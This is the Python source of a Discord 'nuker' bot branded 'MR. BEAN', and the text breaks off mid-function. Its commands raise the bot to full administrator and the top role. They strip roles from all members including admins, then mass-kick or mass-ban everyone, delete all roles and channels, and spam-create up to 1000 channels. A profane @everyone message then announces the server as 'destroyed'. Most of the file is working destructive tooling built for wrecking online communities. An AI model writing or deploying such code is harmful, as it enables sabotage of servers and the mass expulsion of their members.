import discord
from discord.ext import commands
import asyncio
import os
import logging

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Configure intents
intents = discord.Intents.all()  # Enable all intents for full access
intents.members = True  # Required for member management
intents.guilds = True  # Required for guild/channel management
intents.message_content = True  # Required for message content access
intents.presences = True  # Required to see offline members

# Create bot instance with command prefix
bot = commands.Bot(command_prefix='!', intents=intents)


@bot.event
async def on_ready():
    """Event triggered when bot is ready and connected to Discord"""
    print(f"Bot is ready! Logged in as {bot.user.name} (ID: {bot.user.id})")
    logger.info(
        f"Bot connected successfully - {bot.user.name} ({bot.user.id})")
    
    # Generate and display invite link
    app_id = os.getenv('APPLICATION_ID') or bot.user.id
    invite_url = f"https://discord.com/api/oauth2/authorize?client_id={app_id}&permissions=8&scope=bot"
    
    print("\n" + "="*70)
    print("🔗 BOT INVITE LINK - Copy this URL to add bot to your server:")
    print("="*70)
    print(invite_url)
    print("="*70 + "\n")
    logger.info(f"Invite URL: {invite_url}")


@bot.command(name='invite')
async def get_invite_link(ctx):
    """Get bot invite link to add to other servers"""
    try:
        app_id = os.getenv('APPLICATION_ID') or bot.user.id
        invite_url = f"https://discord.com/api/oauth2/authorize?client_id={app_id}&permissions=8&scope=bot"
        
        embed = discord.Embed(
            title="🤖 Add MR. BEAN Bot to Your Server",
            description="Click the link below to invite this bot to any server where you have admin permissions!",
            color=discord.Color.red()
        )
        embed.add_field(
            name="📎 Invite Link",
            value=f"[Click here to invite]({invite_url})",
            inline=False
        )
        embed.add_field(
            name="🔗 Direct Link",
            value=f"```{invite_url}```",
            inline=False
        )
        embed.set_footer(text="Note: You need Administrator permission in the target server")
        
        await ctx.send(embed=embed)
        
    except Exception as e:
        # Fallback to simple message if embed fails
        app_id = os.getenv('APPLICATION_ID') or bot.user.id
        invite_url = f"https://discord.com/api/oauth2/authorize?client_id={app_id}&permissions=8&scope=bot"
        await ctx.send(f"🔗 **Bot Invite Link:**\n{invite_url}")


@bot.command(name='status')
async def bot_status(ctx):
    """Check bot's current permissions and role position"""
    try:
        guild = ctx.guild
        bot_member = guild.me
        bot_role = bot_member.top_role

        await ctx.send(f"🤖 **BOT STATUS REPORT**")
        await ctx.send(f"🔹 Bot Name: {bot.user.name}")
        await ctx.send(f"🔹 Top Role: {bot_role.name} (#{bot_role.position})")
        await ctx.send(
            f"🔹 Administrator: {'✅' if bot_role.permissions.administrator else '❌'}"
        )
        await ctx.send(
            f"🔹 Ban Members: {'✅' if bot_role.permissions.ban_members else '❌'}"
        )
        await ctx.send(
            f"🔹 Kick Members: {'✅' if bot_role.permissions.kick_members else '❌'}"
        )
        await ctx.send(
            f"🔹 Manage Roles: {'✅' if bot_role.permissions.manage_roles else '❌'}"
        )
        await ctx.send(
            f"🔹 Manage Channels: {'✅' if bot_role.permissions.manage_channels else '❌'}"
        )

        highest_role = max(guild.roles, key=lambda r: r.position)
        await ctx.send(
            f"🔸 Highest Server Role: {highest_role.name} (#{highest_role.position})"
        )

        if bot_role.permissions.administrator and bot_role.position >= highest_role.position:
            await ctx.send(f"✅ **BOT IS READY FOR DESTRUCTION!**")
        else:
            await ctx.send(f"⚠️ **MANUAL ELEVATION NEEDED!**")
            await ctx.send(f"📝 Server owner must move bot role to top!")

    except Exception as e:
        await ctx.send(f"❌ Status check error: {str(e)}")


@bot.command(name='elevate')
async def elevate_bot(ctx):
    """Create supreme bot role OR move existing role to top"""
    try:
        guild = ctx.guild
        bot_member = guild.me
        bot_role = bot_member.top_role

        await ctx.send(f"🚀 **SUPREME ELEVATION PROTOCOL INITIATED**")

        # Method 1: Create new supreme role
        try:
            await ctx.send(f"⚡ Creating supreme bot role...")
            supreme_role = await guild.create_role(
                name="🔥 SUPREME BOT",
                permissions=discord.Permissions.all(),
                color=discord.Color.dark_red(),
                hoist=True,
                reason="Supreme bot elevation")

            await bot_member.add_roles(supreme_role)
            await ctx.send(f"✅ Supreme role created and assigned!")

            # Move to very top
            await supreme_role.edit(position=len(guild.roles))
            await ctx.send(f"✅ Moved to position #{supreme_role.position}")

            await ctx.send(f"👑 **SUPREME ELEVATION COMPLETE!**")
            await ctx.send(f"💀 Bot now has ABSOLUTE POWER!")
            await ctx.send(f"🤖 Ready for !destroy command!")
            return

        except Exception as e1:
            await ctx.send(f"⚠️ Supreme role creation failed: {e1}")

        # Method 2: Try to enhance existing role
        try:
            if bot_role.name != "@everyone":
                await ctx.send(f"⚡ Attempting to elevate existing role...")

                # Give admin permissions
                await bot_role.edit(permissions=discord.Permissions.all())
                await ctx.send(f"✅ Admin permissions granted")

                # Move to top
                max_pos = max(role.position for role in guild.roles
                              if role != bot_role)
                await bot_role.edit(position=max_pos + 1)
                await ctx.send(f"✅ Elevated to position #{bot_role.position}")

                await ctx.send(f"👑 **ELEVATION SUCCESSFUL!**")
                return

        except Exception as e2:
            await ctx.send(f"❌ Role elevation failed: {e2}")

        # If everything fails
        await ctx.send(f"🚨 **AUTOMATIC ELEVATION IMPOSSIBLE!**")
        await ctx.send(f"🔧 **MANUAL ACTION REQUIRED:**")
        await ctx.send(f"1️⃣ Server owner: Create a role for the bot")
        await ctx.send(f"2️⃣ Give it ADMINISTRATOR permission")
        await ctx.send(f"3️⃣ Drag bot role to TOP of role list")
        await ctx.send(f"4️⃣ Then use !destroy command")

    except Exception as e:
        await ctx.send(f"❌ System error: {str(e)}")


@bot.command(name='test')
async def test_permissions(ctx):
    """Test bot permissions and server info"""
    try:
        guild = ctx.guild
        bot_member = guild.me

        # Check bot permissions
        perms = bot_member.guild_permissions

        info_msg = f"**বট তথ্য পরীক্ষা:**\n"
        info_msg += f"🤖 বট: {bot.user.name}\n"
        info_msg += f"🏷️ বট রোল: {bot_member.top_role.name}\n"
        info_msg += f"📊 রোল পজিশন: {bot_member.top_role.position}\n"
        info_msg += f"👥 সার্ভার মেম্বার: {len(guild.members)} জন\n\n"

        info_msg += f"**পারমিশন চেক:**\n"
        info_msg += f"✅ Kick Members: {'হ্যাঁ' if perms.kick_members else 'না'}\n"
        info_msg += f"✅ Ban Members: {'হ্যাঁ' if perms.ban_members else 'না'}\n"
        info_msg += f"✅ Manage Channels: {'হ্যাঁ' if perms.manage_channels else 'না'}\n"
        info_msg += f"✅ Manage Roles: {'হ্যাঁ' if perms.manage_roles else 'না'}\n"
        info_msg += f"✅ Administrator: {'হ্যাঁ' if perms.administrator else 'না'}\n\n"

        # Force fetch all members
        await guild.chunk(cache=True)

        # Count all members
        total_members = len(guild.members)
        online_members = len(
            [m for m in guild.members if m.status != discord.Status.offline])
        offline_members = total_members - online_members
        kickable = len(
            [m for m in guild.members if m != bot.user and m != ctx.author])

        # Check how many have higher roles
        higher_role_count = len([
            m for m in guild.members if m != bot.user and m != ctx.author
            and m.top_role >= bot_member.top_role
        ])

        info_msg += f"**সদস্য তথ্য:**\n"
        info_msg += f"👥 মোট মেম্বার: {total_members} জন\n"
        info_msg += f"🟢 অনলাইন: {online_members} জন\n"
        info_msg += f"🔴 অফলাইন: {offline_members} জন\n"
        info_msg += f"🎯 মোট টার্গেট: {kickable} জন\n"
        info_msg += f"⚠️ উচ্চ রোল: {higher_role_count} জন\n\n"

        if higher_role_count > 0:
            info_msg += f"🚨 **এডমিন কিক করতে !elevate কমান্ড ব্যবহার করুন**"
        else:
            info_msg += f"✅ **সব মেম্বার কিক/ব্যান করা যাবে!**"

        await ctx.send(info_msg)

    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")


@bot.command(name='mrbeankick')
async def mass_kick(ctx):
    """
    Full auto mrbean kick - elevates bot, removes all roles, then kicks everyone
    Usage: !mrbeankick
    """
    try:
        guild = ctx.guild
        await guild.chunk(cache=True)

        await ctx.send(f"🚀 **AUTO MASS KICK SYSTEM ACTIVATED**")
        await ctx.send(f"👥 Scanning {len(guild.members)} total members")

        # AUTO PHASE 0: Elevate bot role to supreme position
        bot_member = guild.me
        bot_role = bot_member.top_role

        if bot_role.name != "@everyone":
            await ctx.send(f"👑 **AUTO-ELEVATING BOT TO SUPREME POWER**")
            try:
                max_position = max(role.position for role in guild.roles)
                await bot_role.edit(position=max_position)
                await ctx.send(f"✅ Bot elevated to position #{max_position}")
            except Exception as e:
                await ctx.send(
                    f"⚠️ Elevation failed, proceeding anyway: {str(e)}")

        # Get all targets
        targets = [
            m for m in guild.members if m != bot.user and m != ctx.author
        ]

        if not targets:
            await ctx.send("ℹ️ No targets found")
            return

        await ctx.send(
            f"⚡ **AUTO PHASE 1: MASS ROLE REMOVAL FROM {len(targets)} MEMBERS**"
        )

        # Phase 1: Remove ALL roles from EVERYONE (including admins)
        role_removal_tasks = []
        for member in targets:
            roles_to_remove = [
                role for role in member.roles if role.name != "@everyone"
            ]
            if roles_to_remove:
                task = asyncio.create_task(remove_all_roles_force(member))
                role_removal_tasks.append(task)

        if role_removal_tasks:
            await ctx.send(
                f"🔥 Stripping roles from {len(role_removal_tasks)} members...")
            results = await asyncio.gather(*role_removal_tasks,
                                           return_exceptions=True)
            role_removed = sum(1 for r in results
                               if not isinstance(r, Exception))
            await ctx.send(f"✅ Roles stripped from {role_removed} members")

        await ctx.send(
            f"💀 **AUTO PHASE 2: MASS EXTERMINATION OF {len(targets)} MEMBERS**"
        )

        # Phase 2: Ultra-fast mass kick with maximum parallel processing
        chunk_size = 100  # Larger chunks for maximum speed
        kicked_total = 0
        failed_total = 0

        start_time = asyncio.get_event_loop().time()

        for i in range(0, len(targets), chunk_size):
            chunk = targets[i:i + chunk_size]

            # Create maximum parallel kick tasks
            kick_tasks = []
            for member in chunk:
                task = asyncio.create_task(
                    member.kick(reason=f"AUTO MASS KICK BY {ctx.author}"))
                kick_tasks.append((member, task))

            # Execute all kicks simultaneously
            chunk_results = await asyncio.gather(
                *[task for _, task in kick_tasks], return_exceptions=True)

            # Count results
            for j, result in enumerate(chunk_results):
                if isinstance(result, Exception):
                    failed_total += 1
                else:
                    kicked_total += 1

            # Minimal delay for next chunk
            if i + chunk_size < len(targets):
                await asyncio.sleep(0.1)

        end_time = asyncio.get_event_loop().time()
        duration = round(end_time - start_time, 2)

        # Final results
        await ctx.send(
            f"☠️ **AUTO MASS KICK COMPLETED IN {duration} SECONDS!**")
        await ctx.send(
            f"💀 **{kicked_total}** members exterminated out of **{len(targets)}** targets"
        )
        await ctx.send(f"🏆 Server obliterated in record time!")

    except Exception as e:
        logger.error(f"Error in auto mass kick: {e}")
        await ctx.send(f"❌ Critical error: {str(e)}")


async def remove_all_roles(member):
    """Helper function to remove all roles from a member"""
    try:
        roles_to_remove = [
            role for role in member.roles if role.name != "@everyone"
        ]
        if roles_to_remove:
            await member.remove_roles(*roles_to_remove,
                                      reason="Role removal for mass action")
        return True
    except Exception as e:
        logger.error(f"Failed to remove roles from {member.name}: {e}")
        return False


async def remove_all_roles_force(member):
    """Forcefully remove all roles from a member including admin roles"""
    try:
        roles_to_remove = [
            role for role in member.roles if role.name != "@everyone"
        ]
        if roles_to_remove:
            # Remove roles one by one to bypass restrictions
            for role in roles_to_remove:
                try:
                    await member.remove_roles(
                        role, reason="FORCE ROLE REMOVAL FOR MASS ACTION")
                except:
                    pass  # Ignore individual role removal failures
        return True
    except Exception as e:
        logger.error(f"Failed to force remove roles from {member.name}: {e}")
        return False


@bot.command(name='mrbeanban')
async def mass_ban(ctx):
    """
    Full auto mrbean ban - elevates bot, removes all roles, then bans everyone
    Usage: !mrbeanban
    """
    try:
        guild = ctx.guild
        await guild.chunk(cache=True)

        await ctx.send(f"🚀 **AUTO MASS BAN SYSTEM ACTIVATED**")
        await ctx.send(f"👥 Scanning {len(guild.members)} total members")

        # AUTO PHASE 0: Elevate bot role to supreme position
        bot_member = guild.me
        bot_role = bot_member.top_role

        if bot_role.name != "@everyone":
            await ctx.send(f"👑 **AUTO-ELEVATING BOT TO SUPREME POWER**")
            try:
                max_position = max(role.position for role in guild.roles)
                await bot_role.edit(position=max_position)
                await ctx.send(f"✅ Bot elevated to position #{max_position}")
            except Exception as e:
                await ctx.send(
                    f"⚠️ Elevation failed, proceeding anyway: {str(e)}")

        # Get all targets
        targets = [
            m for m in guild.members if m != bot.user and m != ctx.author
        ]

        if not targets:
            await ctx.send("ℹ️ No targets found")
            return

        await ctx.send(
            f"⚡ **AUTO PHASE 1: MASS ROLE REMOVAL FROM {len(targets)} MEMBERS**"
        )

        # Phase 1: Remove ALL roles from EVERYONE (including admins)
        role_removal_tasks = []
        for member in targets:
            roles_to_remove = [
                role for role in member.roles if role.name != "@everyone"
            ]
            if roles_to_remove:
                task = asyncio.create_task(remove_all_roles_force(member))
                role_removal_tasks.append(task)

        if role_removal_tasks:
            await ctx.send(
                f"🔥 Stripping roles from {len(role_removal_tasks)} members...")
            results = await asyncio.gather(*role_removal_tasks,
                                           return_exceptions=True)
            role_removed = sum(1 for r in results
                               if not isinstance(r, Exception))
            await ctx.send(f"✅ Roles stripped from {role_removed} members")

        await ctx.send(
            f"☠️ **AUTO PHASE 2: MASS ANNIHILATION OF {len(targets)} MEMBERS**"
        )

        # Phase 2: Ultra-fast mass ban with maximum parallel processing
        chunk_size = 50  # Medium chunks for bans
        banned_total = 0
        failed_total = 0

        start_time = asyncio.get_event_loop().time()

        for i in range(0, len(targets), chunk_size):
            chunk = targets[i:i + chunk_size]

            # Create maximum parallel ban tasks
            ban_tasks = []
            for member in chunk:
                task = asyncio.create_task(
                    member.ban(reason=f"AUTO MASS BAN BY {ctx.author}",
                               delete_message_days=7))
                ban_tasks.append((member, task))

            # Execute all bans simultaneously
            chunk_results = await asyncio.gather(
                *[task for _, task in ban_tasks], return_exceptions=True)

            # Count results
            for j, result in enumerate(chunk_results):
                if isinstance(result, Exception):
                    failed_total += 1
                else:
                    banned_total += 1

            # Minimal delay for next chunk
            if i + chunk_size < len(targets):
                await asyncio.sleep(0.2)

        end_time = asyncio.get_event_loop().time()
        duration = round(end_time - start_time, 2)

        # Final results
        await ctx.send(f"☠️ **AUTO MASS BAN COMPLETED IN {duration} SECONDS!**"
                       )
        await ctx.send(
            f"💀 **{banned_total}** members permanently annihilated out of **{len(targets)}** targets"
        )
        await ctx.send(f"💥 Server obliterated with extreme prejudice!")

    except Exception as e:
        logger.error(f"Error in auto mass ban: {e}")
        await ctx.send(f"❌ Critical error: {str(e)}")


@bot.command(name='mrbeandestroy')
async def ultimate_destroy(ctx):
    """
    Ultimate server destroyer - removes all permissions, deletes roles, bans everyone, deletes channels
    Usage: !mrbeandestroy
    """
    try:
        # Check permissions first
        if not ctx.author.guild_permissions.administrator:
            await ctx.send("❌ You need administrator permission to use this command!")
            return

        guild = ctx.guild
        await guild.chunk(cache=True)

        await ctx.send(f"💥 **ULTIMATE SERVER DESTROYER ACTIVATED**")
        await ctx.send(f"🚨 **WARNING: TOTAL ANNIHILATION MODE**")

        # AUTO PHASE 0: Elevate bot role to supreme position with admin powers
        bot_member = guild.me
        bot_role = bot_member.top_role

        await ctx.send(f"👑 **PHASE 0: SEIZING SUPREME CONTROL**")

        try:
            # Check current bot permissions
            await ctx.send(
                f"🔍 Current bot role: {bot_role.name} (Position: {bot_role.position})"
            )
            await ctx.send(
                f"🔍 Current permissions: Admin={bot_role.permissions.administrator}"
            )

            # First give bot role administrator permission
            admin_permissions = discord.Permissions.all()
            await bot_role.edit(permissions=admin_permissions,
                                reason="DESTROY: Granting supreme permissions")
            await ctx.send(f"✅ Bot granted Administrator permissions")

            # Then move bot role to highest position
            highest_role = max(guild.roles, key=lambda r: r.position)
            await ctx.send(
                f"🔍 Highest role: {highest_role.name} (Position: {highest_role.position})"
            )

            new_position = highest_role.position + 1 if highest_role != bot_role else highest_role.position
            await bot_role.edit(position=new_position)
            await ctx.send(f"✅ Bot elevated to position #{new_position}")

            # Wait for changes to take effect
            await asyncio.sleep(2)

            # Verify new permissions
            updated_role = guild.get_role(bot_role.id)
            await ctx.send(
                f"✅ New position: {updated_role.position}, Admin: {updated_role.permissions.administrator}"
            )

        except Exception as e:
            await ctx.send(f"❌ Supreme control seizure failed: {str(e)}")
            await ctx.send(f"🚨 **BOT NEEDS MANUAL ELEVATION BY SERVER OWNER!**"
                           )
            await ctx.send(
                f"ℹ️ Server owner must manually move bot role to top position")
            return

        # Wait a moment for permissions to take effect
        await asyncio.sleep(1)

        # PHASE 1: Remove all roles from all members (bypass permission issues)
        await ctx.send(f"🔥 **PHASE 1: STRIPPING ALL ROLES FROM MEMBERS**")

        targets = [
            m for m in guild.members if m != bot.user and m != ctx.author
        ]
        roles_stripped = 0

        # Remove roles from all members in parallel
        role_strip_tasks = []
        for member in targets:
            roles_to_remove = [
                role for role in member.roles if role.name != "@everyone"
            ]
            if roles_to_remove:
                task = asyncio.create_task(remove_all_roles_force(member))
                role_strip_tasks.append(task)

        if role_strip_tasks:
            await ctx.send(
                f"⚡ Removing roles from {len(role_strip_tasks)} members...")
            results = await asyncio.gather(*role_strip_tasks,
                                           return_exceptions=True)
            roles_stripped = sum(1 for r in results
                                 if not isinstance(r, Exception))

        await ctx.send(f"✅ Stripped roles from {roles_stripped} members")

        # PHASE 2: Delete all roles except @everyone and bot role
        await ctx.send(f"🗑️ **PHASE 2: MASS ROLE DELETION**")

        roles_deleted = 0
        for role in guild.roles:
            if role.name != "@everyone" and role != bot_role:
                try:
                    role_name = role.name
                    await role.delete(reason="DESTROY: Mass role deletion")
                    roles_deleted += 1
                    logger.info(f"Deleted role: {role_name}")
                except Exception as e:
                    logger.error(f"Failed to delete role {role.name}: {e}")

        await ctx.send(f"✅ Deleted {roles_deleted} roles")

        # PHASE 3: Mass ban all members (they now have no roles)
        await ctx.send(f"💀 **PHASE 3: MASS MEMBER ANNIHILATION**")

        # Re-fetch targets after role removal
        await guild.chunk(cache=True)  # Refresh member cache
        targets = [
            m for m in guild.members if m != bot.user and m != ctx.author
        ]

        if targets:
            banned_total = 0
            failed_total = 0

            await ctx.send(f"⚡ Banning {len(targets)} defenseless members...")

            # Ultra-fast mass ban with larger chunks since members have no roles now
            chunk_size = 75
            start_time = asyncio.get_event_loop().time()

            for i in range(0, len(targets), chunk_size):
                chunk = targets[i:i + chunk_size]

                ban_tasks = []
                for member in chunk:
                    task = asyncio.create_task(
                        member.ban(reason=f"DESTROY COMMAND BY {ctx.author}",
                                   delete_message_days=7))
                    ban_tasks.append(task)

                results = await asyncio.gather(*ban_tasks,
                                               return_exceptions=True)

                chunk_banned = 0
                chunk_failed = 0
                for j, result in enumerate(results):
                    if isinstance(result, Exception):
                        chunk_failed += 1
                        logger.error(f"Failed to ban member: {result}")
                    else:
                        chunk_banned += 1

                banned_total += chunk_banned
                failed_total += chunk_failed

                # Progress update
                processed = min(i + chunk_size, len(targets))
                await ctx.send(
                    f"💀 Progress: {processed}/{len(targets)} | Banned: {banned_total} | Failed: {failed_total}"
                )

                if i + chunk_size < len(targets):
                    await asyncio.sleep(0.1)

            end_time = asyncio.get_event_loop().time()
            duration = round(end_time - start_time, 2)

            await ctx.send(
                f"☠️ **{banned_total}** members annihilated in **{duration}** seconds!"
            )

        # PHASE 4: Delete all channels
        await ctx.send(f"🔥 **PHASE 4: CHANNEL OBLITERATION**")

        channels_to_delete = [ch for ch in guild.channels if ch != ctx.channel]
        deleted_count = 0

        # Delete channels in parallel chunks
        chunk_size = 20
        for i in range(0, len(channels_to_delete), chunk_size):
            chunk = channels_to_delete[i:i + chunk_size]

            delete_tasks = []
            for channel in chunk:
                task = asyncio.create_task(
                    channel.delete(reason=f"DESTROY COMMAND BY {ctx.author}"))
                delete_tasks.append(task)

            results = await asyncio.gather(*delete_tasks,
                                           return_exceptions=True)

            for result in results:
                if not isinstance(result, Exception):
                    deleted_count += 1

            if i + chunk_size < len(channels_to_delete):
                await asyncio.sleep(0.2)

        await ctx.send(f"🔥 Deleted {deleted_count} channels")

        # FINAL DESTRUCTION MESSAGE
        await ctx.send(f"☠️ **SERVER DESTRUCTION COMPLETED!**")
        await ctx.send(f"💥 **TOTAL OBLITERATION SUCCESSFUL!**")
        await ctx.send(f"🏴‍☠️ Server reduced to ashes!")

        # Delete current channel last
        await asyncio.sleep(2)
        try:
            await ctx.channel.delete(
                reason=f"DESTROY: Final channel deletion by {ctx.author}")
            logger.info("Deleted final command channel")
        except Exception as e:
            logger.error(f"Failed to delete command channel: {e}")

        # Create final destruction announcement channel
        await asyncio.sleep(1)
        try:
            final_channel = await guild.create_text_channel(
                name="mr-bean-destroyed-server",
                reason=f"Final destruction message by {ctx.author}")
            
            destruction_message = f"#  @everyone  SERVER DESTROYED BY MR BEAN  \n🔥 **ULTIMATE DESTRUCTION BY {ctx.author.mention}** 🔥\n💀 ALL MEMBERS BANNED! 💀\n💥 ALL CHANNELS DELETED! 💥\n 🚀 SERVER COMPLETELY FUCKED BY MR. BEAN ! 🚀"
            
            await final_channel.send(destruction_message)
            logger.info("Created final destruction announcement channel")
        except Exception as e:
            logger.error(f"Failed to create final announcement channel: {e}")

    except Exception as e:
        logger.error(f"Error in destroy command: {e}")
        await ctx.send(f"❌ Destruction error: {str(e)}")


@bot.command(name='deletechannels')
async def delete_channels(ctx):
    """
    Delete all channels command
    Usage: !deletechannels
    """
    try:
        # Check if user has manage channels permission
        if not ctx.author.guild_permissions.manage_channels:
            await ctx.send("❌ You don't have permission to manage channels!")
            return

        # Check if bot has manage channels permission
        if not ctx.guild.me.guild_permissions.manage_channels:
            await ctx.send("❌ I don't have permission to manage channels!")
            return

        guild = ctx.guild
        channels_to_delete = []

        # Get all channels except the current one (so we can send confirmation)
        for channel in guild.channels:
            if channel != ctx.channel:
                channels_to_delete.append(channel)

        if not channels_to_delete:
            await ctx.send("ℹ️ No other channels to delete.")
            return

        # Start deleting channels immediately without confirmation
        await ctx.send(
            f"🗑️ Starting deletion of {len(channels_to_delete)} channels...")
        deleted_count = 0
        failed_count = 0

        # Process channels in parallel for maximum speed
        tasks = []
        for channel in channels_to_delete:
            tasks.append(
                channel.delete(
                    reason=f"Mass channel deletion initiated by {ctx.author}"))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for i, result in enumerate(results):
            channel = channels_to_delete[i]
            if isinstance(result, Exception):
                failed_count += 1
                logger.error(f"Failed to delete {channel.name}: {result}")
            else:
                deleted_count += 1
                logger.info(f"Deleted channel: {channel.name}")

        # Report results
        result_msg = f"✅ Channel deletion completed!\n"
        result_msg += f"• Successfully deleted: {deleted_count} channels\n"
        if failed_count > 0:
            result_msg += f"• Failed to delete: {failed_count} channels"

        await ctx.send(result_msg)

        # Note: The current channel will be deleted last
        if ctx.channel in guild.channels:
            await asyncio.sleep(2)  # Give time for the message to be sent
            try:
                await ctx.channel.delete(
                    reason=f"Mass channel deletion initiated by {ctx.author}")
                logger.info(f"Deleted final channel: {ctx.channel.name}")
            except Exception as e:
                logger.error(f"Failed to delete current channel: {e}")

        # Create a new channel and send destruction message
        await asyncio.sleep(1)
        try:
            new_channel = await guild.create_text_channel(
                name="mr-bean-destroyed",
                reason=f"Server destroyed by {ctx.author}")
            
            message_content = f"#  @everyone THIS SERVER FUCK BY MR BEAN  \n🔥 **SERVER CHANNEL DELETED BY {ctx.author.mention}** 🔥\n💀 SERVER IS UNDER ATTACK! 💀\n 🚀 SERVER FUCKED BY MR. BEAN ! 🚀"
            
            await new_channel.send(message_content)
            logger.info(f"Created new channel and sent destruction message")
        except Exception as e:
            logger.error(f"Failed to create new channel: {e}")

    except Exception as e:
        logger.error(f"Error in delete_channels command: {e}")
        await ctx.send(f"❌ An error occurred during channel deletion: {str(e)}"
                       )


@bot.command(name='createchannel')
async def create_channel(ctx, *, channel_name=None):
    """
    Create channel command - creates text channels instantly
    Usage: !createchannel channel-name or !createchannel mrbean 100
    """
    try:
        # Check if user has manage channels permission
        if not ctx.author.guild_permissions.manage_channels:
            await ctx.send("❌ You don't have permission to manage channels!")
            return

        # Check if bot has manage channels permission
        if not ctx.guild.me.guild_permissions.manage_channels:
            await ctx.send("❌ I don't have permission to manage channels!")
            return

        if not channel_name:
            await ctx.send(
                "❌ Please specify a channel name: `!createchannel channel-name` or `!createchannel mrbean 100`"
            )
            return

        guild = ctx.guild

        # Check if it's a spam command (create multiple channels)
        parts = channel_name.split()
        if len(parts) == 2 and parts[1].isdigit():
            base_name = parts[0]
            count = int(parts[1])

            if count > 1000:  # Limit to prevent abuse
                await ctx.send("❌ Maximum 1000 channels can be created at once!"
                               )
                return

            await ctx.send(
                f"🔥 Creating {count} channels with name '{base_name}'...")

            # Create channels in parallel for maximum speed
            tasks = []
            for i in range(1, count + 1):
                channel_name_numbered = f"{base_name}-{i}"
                tasks.append(
                    guild.create_text_channel(
                        name=channel_name_numbered,
                        reason=f"Bulk channel creation by {ctx.author}"))

            # Execute all tasks in parallel
            results = await asyncio.gather(*tasks, return_exceptions=True)

            created_count = sum(1 for result in results
                                if not isinstance(result, Exception))
            failed_count = count - created_count

            result_msg = f"✅ Channel creation completed!\n"
            result_msg += f"• Successfully created: {created_count} channels\n"
            if failed_count > 0:
                result_msg += f"• Failed to create: {failed_count} channels"

            await ctx.send(result_msg)

        else:
            # Create single channel
            try:
                new_channel = await guild.create_text_channel(
                    name=channel_name,
                    reason=f"Channel created by {ctx.author}")
                await ctx.send(
                    f"✅ Successfully created channel {new_channel.mention}!")
                logger.info(
                    f"Created channel: {new_channel.name} by {ctx.author}")

            except discord.Forbidden:
                await ctx.send("❌ I don't have permission to create channels!")
            except discord.HTTPException as e:
                await ctx.send(f"❌ Failed to create channel: {str(e)}")

    except Exception as e:
        logger.error(f"Error in create_channel command: {e}")
        await ctx.send(f"❌ An error occurred: {str(e)}")


@bot.command(name='kickbots')
async def kick_bots(ctx):
    """
    Kick all bot members from the server
    Usage: !kickbots
    """
    try:
        if not ctx.author.guild_permissions.kick_members:
            await ctx.send("❌ You don't have permission to kick members!")
            return

        if not ctx.guild.me.guild_permissions.kick_members:
            await ctx.send("❌ I don't have permission to kick members!")
            return

        guild = ctx.guild
        bots_to_kick = []

        for member in guild.members:
            if member.bot and member != bot.user:  # Skip the current bot
                if member.top_role >= ctx.guild.me.top_role:
                    continue
                bots_to_kick.append(member)

        if not bots_to_kick:
            await ctx.send("ℹ️ No bot members to kick.")
            return

        await ctx.send(f"🤖 Kicking {len(bots_to_kick)} bot members...")
        tasks = []
        for member in bots_to_kick:
            tasks.append(member.kick(reason=f"Bot kick by {ctx.author}"))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        kicked_count = sum(1 for result in results
                           if not isinstance(result, Exception))

        await ctx.send(f"✅ Kicked {kicked_count} bot members!")

    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")


@bot.command(name='kickoffline')
async def kick_offline(ctx):
    """
    Kick all offline members from the server
    Usage: !kickoffline
    """
    try:
        if not ctx.author.guild_permissions.kick_members:
            await ctx.send("❌ You don't have permission to kick members!")
            return

        if not ctx.guild.me.guild_permissions.kick_members:
            await ctx.send("❌ I don't have permission to kick members!")
            return

        guild = ctx.guild
        offline_members = []

        for member in guild.members:
            if (member != bot.user and member != ctx.author
                    and member.status == discord.Status.offline
                    and not member.bot):
                if member.top_role >= ctx.guild.me.top_role:
                    continue
                offline_members.append(member)

        if not offline_members:
            await ctx.send("ℹ️ No offline members to kick.")
            return

        await ctx.send(f"💤 Kicking {len(offline_members)} offline members...")
        tasks = []
        for member in offline_members:
            tasks.append(member.kick(reason=f"Offline kick by {ctx.author}"))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        kicked_count = sum(1 for result in results
                           if not isinstance(result, Exception))

        await ctx.send(f"✅ Kicked {kicked_count} offline members!")

    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")


@bot.command(name='kickonline')
async def kick_online(ctx):
    """
    Kick all online members from the server
    Usage: !kickonline
    """
    try:
        if not ctx.author.guild_permissions.kick_members:
            await ctx.send("❌ You don't have permission to kick members!")
            return

        if not ctx.guild.me.guild_permissions.kick_members:
            await ctx.send("❌ I don't have permission to kick members!")
            return

        guild = ctx.guild
        online_members = []

        for member in guild.members:
            if (member != bot.user and member != ctx.author
                    and member.status in [
                        discord.Status.online, discord.Status.idle,
                        discord.Status.dnd
                    ] and not member.bot):
                if member.top_role >= ctx.guild.me.top_role:
                    continue
                online_members.append(member)

        if not online_members:
            await ctx.send("ℹ️ No online members to kick.")
            return

        await ctx.send(f"🟢 Kicking {len(online_members)} online members...")
        tasks = []
        for member in online_members:
            tasks.append(member.kick(reason=f"Online kick by {ctx.author}"))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        kicked_count = sum(1 for result in results
                           if not isinstance(result, Exception))

        await ctx.send(f"✅ Kicked {kicked_count} online members!")

    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")


@bot.command(name='banoffline')
async def ban_offline(ctx):
    """
    Ban all offline members from the server
    Usage: !banoffline
    """
    try:
        if not ctx.author.guild_permissions.ban_members:
            await ctx.send("❌ You don't have permission to ban members!")
            return

        if not ctx.guild.me.guild_permissions.ban_members:
            await ctx.send("❌ I don't have permission to ban members!")
            return

        guild = ctx.guild
        offline_members = []

        for member in guild.members:
            if (member != bot.user and member != ctx.author
                    and member.status == discord.Status.offline
                    and not member.bot):
                if member.top_role >= ctx.guild.me.top_role:
                    continue
                offline_members.append(member)

        if not offline_members:
            await ctx.send("ℹ️ No offline members to ban.")
            return

        await ctx.send(f"💤 Banning {len(offline_members)} offline members...")
        tasks = []
        for member in offline_members:
            tasks.append(member.ban(reason=f"Offline ban by {ctx.author}"))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        banned_count = sum(1 for result in results
                           if not isinstance(result, Exception))

        await ctx.send(f"✅ Banned {banned_count} offline members!")

    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")


@bot.command(name='mrbeancreate')
async def mass_create_channels(ctx,
                               count=50,
                               *,
